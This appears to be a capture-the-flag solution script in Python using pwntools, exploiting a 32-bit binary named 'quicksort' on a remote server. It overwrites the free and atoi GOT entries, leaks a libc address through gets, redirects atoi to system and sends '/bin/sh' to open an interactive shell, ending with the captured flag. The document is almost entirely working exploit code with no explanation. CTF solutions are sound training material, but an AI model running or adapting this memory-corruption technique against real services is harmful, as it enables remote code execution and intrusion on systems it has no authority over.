from pwn import *

# r = process('./quicksort')
r = remote('34.92.96.238',10000)

r.recvuntil('sort?')
r.sendline('1')

def q(obj, total_cnt, i, data):
	tmp = str(obj).ljust(0x10,'\x00') + p32(total_cnt) + p32(i) + p32(0) + p32(data)
	return tmp

def int32(x):
	if x>0xFFFFFFFF:
		raise OverflowError
	if x>0x7FFFFFFF:
		x=int(0x100000000-x)
		if x<2147483648:
			return -x
		else:
			return -2147483648
	return x

# Overwrite free -> main, Leak gets's addr
free = 0x0804A018
main = 0x08048816

query = q(main,2,1,free-4)
r.recvuntil(':')
r.sendline(query)

output = r.recvuntil('sort?')
gets = u32(p32(int(output.split('\n')[1].split(' ')[0]),sign=unsigned))

# Local
libc = gets - 0x5f3e0
system = libc +  241056

# Remote
libc = gets - 0x0005F3E0
system = libc + 0x0003ADA0
atoi = 0x0804A038

# Overwrite atoi -> system
r.sendline('1')
query = q(int32(system),1,0,atoi)
r.recvuntil(':')
r.sendline(query)

# Get Shell
r.recvuntil('sort?')
r.sendline('1')
r.recvuntil(':')
r.sendline('/bin/sh')

r.interactive()

# FLAG : *CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}